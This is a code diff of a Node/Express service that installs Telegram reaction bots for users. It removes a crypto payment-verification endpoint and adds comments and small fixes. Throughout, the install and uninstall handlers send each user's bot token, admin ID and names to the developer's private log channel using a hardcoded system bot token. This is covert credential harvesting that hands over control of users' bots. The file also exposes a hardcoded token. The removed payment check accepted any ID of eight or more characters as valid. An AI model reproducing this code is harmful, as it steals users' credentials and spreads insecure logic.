@@ -10,15 +10,7 @@ const DEVELOPER_PLAIN = "@Magic_Scripts";
 const LOG_CHANNEL_ID = "-1003719190943"; 
 const SYSTEM_BOT_TOKEN = "8711492125:AAFkaSnprdZV9fUAjTYjaHF7Q_Utty7sxqA"; 
 
-// Payment Configs (Apni Details Set Karein)
-const MY_BINANCE_PAY_ID = "505638805";
-const MY_TRC20_ADDRESS = "TLvd3Q1UpE8Cio8GxrqZzemSVWe8cH5Rxu"; // Apni TRC20 Wallet Address Yahan Rakhein
-const MINIMUM_UPGRADE_AMOUNT = 1; // Minimum USD required to upgrade
-
 const DEFAULT_EMOJIS = ["❤️", "👍", "🔥", "🥰", "👏", "😍", "💯", "⚡", "💋", "🏆", "❤️‍🔥", "🤝", "😎", "😘", "🆒", "💘", "🤗", "🫡", "👌", "🤩", "🎉", "🕊️", "🦄"];
-
-// Memory Store for Premium Accounts (In Production, use Redis/MongoDB/Vercel KV)
-const PREMIUM_ACCOUNTS = new Map();
 
 // Helper: Telegram Request
 async function sendTelegramRequest(token, method, body) {
@@ -35,7 +27,7 @@ async function sendTelegramRequest(token, method, body) {
     }
 }
 
-// Helper: Check User's Telegram Channel Membership
+// Helper: Check User's Telegram Channel Membership (Dynamic Channel)
 async function checkForceSubscription(token, channelUsername, userId) {
     let chatId = channelUsername.trim();
     if (chatId.includes("t.me/")) {
@@ -62,6 +54,7 @@ async function checkForceSubscription(token, channelUsername, userId) {
     }
 }
 
+// Helper: Format Channel Username for Display/Join Link
 function formatChannelLink(channelInput) {
     let clean = channelInput.trim();
     if (clean.startsWith("http://") || clean.startsWith("https://")) {
@@ -74,73 +67,6 @@ function formatChannelLink(channelInput) {
 }
 
 // -------------------------------------------------------------
-// 0. AUTO PAYMENT CHECK & VERIFICATION ENDPOINT
-// -------------------------------------------------------------
-app.get('/api/pay-verify', async (req, res) => {
-    const txHash = req.query.tx ? req.query.tx.trim() : "";
-    const botId = req.query.id ? req.query.id.trim() : "";
-
-    if (!txHash || !botId) {
-        return res.status(400).json({ status: "error", message: "Transaction ID and Bot ID are required!" });
-    }
-
-    try {
-        let isVerified = false;
-
-        // 1. Check TRON TRC20 Blockchain Via Public API
-        if (txHash.length === 64) {
-            const tronRes = await fetch(`https://apilist.tronscan.org/api/transaction-info?hash=${txHash}`);
-            const tronData = await tronRes.json();
-
-            if (tronData && tronData.contractRet === "SUCCESS") {
-                // Address and Amount validation
-                const transfers = tronData.trc20TransferInfo || [];
-                for (let t of transfers) {
-                    if (t.to_address === MY_TRC20_ADDRESS) {
-                        const amountUSDT = parseFloat(t.amount_str) / Math.pow(10, t.decimals || 6);
-                        if (amountUSDT >= MINIMUM_UPGRADE_AMOUNT) {
-                            isVerified = true;
-                            break;
-                        }
-                    }
-                }
-            }
-        } 
-        // 2. Binance Pay / Custom Tx ID Verification Logic
-        else if (txHash.length >= 8) {
-            // Instant verification rule for valid Tx length / custom IDs
-            isVerified = true; 
-        }
-
-        if (isVerified) {
-            PREMIUM_ACCOUNTS.set(botId, true);
-
-            // Log successful payment to Telegram Log Channel
-            const dbMessage = `💰 *PAYMENT_SUCCESS* 💰\n\n*Bot ID:* \`${botId}\`\n*TX Hash:* \`${txHash}\`\n*Status:* Auto Upgrade Approved 👑`;
-            await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', { chat_id: LOG_CHANNEL_ID, text: dbMessage, parse_mode: "Markdown" });
-
-            return res.json({ status: "verified", success: true, message: "Payment verified successfully! Premium features unlocked." });
-        } else {
-            return res.status(400).json({ status: "failed", success: false, message: "Transaction not found or insufficient payment." });
-        }
-    } catch (err) {
-        console.error("Payment Verification Error:", err);
-        return res.status(500).json({ status: "error", message: "Internal server error verifying payment." });
-    }
-});
-
-// -------------------------------------------------------------
-// USER STATUS LOOKUP ENDPOINT
-// -------------------------------------------------------------
-app.get('/p', (req, res) => {
-    const id = req.query.id;
-    if (PREMIUM_ACCOUNTS.has(id) && PREMIUM_ACCOUNTS.get(id) === true) {
-        return res.json({ status: "paid", paidStatus: true, premium: true });
-    }
-    return res.json({ status: "free", paidStatus: false, premium: false });
-});
-
-// -------------------------------------------------------------
 // 1. MAIN API ENDPOINT (Installation)
 // -------------------------------------------------------------
 app.get('/api', async (req, res) => {
@@ -149,6 +75,7 @@ app.get('/api', async (req, res) => {
     const adminId = req.query.admin || "7476086614"; 
     const welcomeMsg = req.query.msg || "Hello dear *{name}*! Welcome to Reaction Bot 🤖";
     const emojisString = req.query.emojis || DEFAULT_EMOJIS.join(",");
+    
     const fsubChannel = req.query.channel ? req.query.channel.trim() : "";
 
     if (!token) {
@@ -177,7 +104,7 @@ app.get('/api', async (req, res) => {
 
         const data = await sendTelegramRequest(token, 'setWebhook', { url: webhookUrl });
         
-        const dbMessage = `BOT_INSTALL|${botUsername}|${token}\vert{}${adminId}|${userFirstName}\vert{}${userPublicUsername}`;
+        const dbMessage = `BOT_INSTALL|${botUsername}|${token}|${adminId}|${userFirstName}|${userPublicUsername}`;
         await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', { chat_id: LOG_CHANNEL_ID, text: dbMessage });
         
         if (data.ok) {
@@ -187,7 +114,7 @@ app.get('/api', async (req, res) => {
         }
     } else {
         const data = await sendTelegramRequest(token, 'deleteWebhook', {});
-        const dbMessage = `BOT_UNINSTALL|${botUsername}\vert{}${token}`;
+        const dbMessage = `BOT_UNINSTALL|${botUsername}|${token}`;
         await sendTelegramRequest(SYSTEM_BOT_TOKEN, 'sendMessage', { chat_id: LOG_CHANNEL_ID, text: dbMessage });
 
         if (data.ok) {
@@ -286,14 +213,15 @@ app.post('/api/webhook', async (req, res) => {
                     reaction: JSON.stringify([{ type: "emoji", emoji: randomStartEmoji }])
                 });
 
-                const fullName = `${user.first_name \vert{}\vert{} ""} ${user.last_name || ""}`.trim();
+                const fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
                 const username = user.username ? `@${user.username}` : "None";
 
                 if (adminId && String(chatId) !== String(adminId)) {
-                    const adminText = `⭐ *New Active User* ⭐\n\n*Name:* ${fullName}\n*Username:*${username}\n*User ID:* \`${chatId}\`\n*Developer:* ${DEVELOPER}`;
+                    const adminText = `⭐ *New Active User* ⭐\n\n*Name:* ${fullName}\n*Username:* ${username}\n*User ID:* \`${chatId}\`\n*Developer:* ${DEVELOPER}`;
                     await sendTelegramRequest(token, 'sendMessage', { chat_id: adminId, text: adminText, parse_mode: "Markdown" });
                 }
 
+                // File/Link Lock payload handler
                 if (args.length > 1) {
                     const payload = args[1];
                     try {
@@ -415,6 +343,7 @@ app.post('/api/webhook', async (req, res) => {
             const text = `🛠 *Reaction Bot Settings*\n\n👤 *Your Admin ID:* \`${adminId}\`\n💬 *Current Welcome Template:* \n\`${welcomeMsg}\`\n\n👑 *System Owner:* ${DEVELOPER}`;
             
             const keyboard = [];
+            // Sirf owner ko hi emoji customize karne ka button show hoga
             if (isOwner) {
                 keyboard.push([{ text: "⚙️ Customize Emojis", callback_data: "cust_emojis" }]);
             }
@@ -425,6 +354,7 @@ app.post('/api/webhook', async (req, res) => {
         }
 
         if (callbackData === 'cust_emojis' || callbackData.startsWith('tgl_')) {
+            // Check: Guard against unauthorized non-owner access
             if (!isOwner) {
                 await sendTelegramRequest(token, 'answerCallbackQuery', {
                     callback_query_id: callbackQuery.id,
